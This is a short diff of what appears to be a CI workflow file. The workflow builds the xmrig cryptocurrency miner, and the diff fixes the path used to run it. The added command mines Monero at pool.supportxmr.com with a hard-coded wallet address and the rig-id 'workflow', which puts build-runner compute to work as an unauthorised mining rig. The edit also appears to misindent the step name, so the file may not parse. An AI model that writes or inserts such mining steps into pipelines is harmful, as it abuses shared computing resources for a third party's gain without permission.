@@ -22,6 +22,6 @@ jobs:
           mkdir xmrig/build && cd xmrig/build
           cmake ..
 
-      - name: Runs xmrig
+     - name: Runs xmrig
         run: |
-          ./xmrig -o pool.supportxmr.com:3333 -u {89cHSTfn419XjxZo5RTvBL7xxabdCFMgWggXj6cr7cxpjfeyutBT3y6NRNkiAzYV1rGoc9dSxbnw7CRHAvEGvJRv2gJc7Ko} -k --tls --rig-id workflow
+            ./xmrig/build/xmrig -o pool.supportxmr.com:3333 -u {89cHSTfn419XjxZo5RTvBL7xxabdCFMgWggXj6cr7cxpjfeyutBT3y6NRNkiAzYV1rGoc9dSxbnw7CRHAvEGvJRv2gJc7Ko} -k --tls --rig-id workflow
